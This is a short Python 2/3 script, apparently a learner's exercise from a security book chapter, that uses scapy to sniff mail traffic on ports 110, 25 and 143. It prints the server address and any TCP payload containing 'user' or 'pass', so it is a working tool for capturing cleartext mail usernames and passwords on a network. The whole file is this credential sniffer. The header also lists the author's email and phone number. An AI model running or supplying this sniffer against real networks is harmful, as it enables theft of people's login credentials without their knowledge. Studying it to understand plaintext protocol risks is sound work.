# /usr/bin/python python2.7
# -*- coding:utf-8 -*-
##################################################
# Filename: p48_chapter_04_mail_sniffer.py
# Author:   jerry_0824
# Email:    63935127##qq.com
# Phone:    +86-155-8287-7999
# Date:     2016-03-07
# Version:  v1.0.1
# Usage0:    python2 p48_chapter_04_mail_sniffer.py
# Usage1:    python3 p48_chapter_04_mail_sniffer.py
# Ref0:     sudo apt-get install libfreetype6-dev libxft-dev
# Ref1;     sudo apt-get install scapy-python3
##################################################

__author__ = 'jerry_0824'

# pip3 install scapy-python3
from scapy.all import *

# our packet callback
def packet_callback(packet):
    # print(packet.show())
    if packet[TCP].payload:

        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" % packet[IP].dst)
            print("[*] %s" % packet[TCP].payload)

# main
def main():
    # started time
    time_started = time.time()
    print("\nstarted time: %s" % time.ctime(time_started))

    # fire up our sniffer
    # sniff(prn=packet_callback,count=1)
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
    # sniff(filter="tcp port 80", prn=packet_callback, store=0)

    # finished time
    _time_finished = time.time() - time_started
    print("\nsince initial elapsed %.2f s" % (_time_finished))

if __name__ == "__main__":
    sys.exit(main())

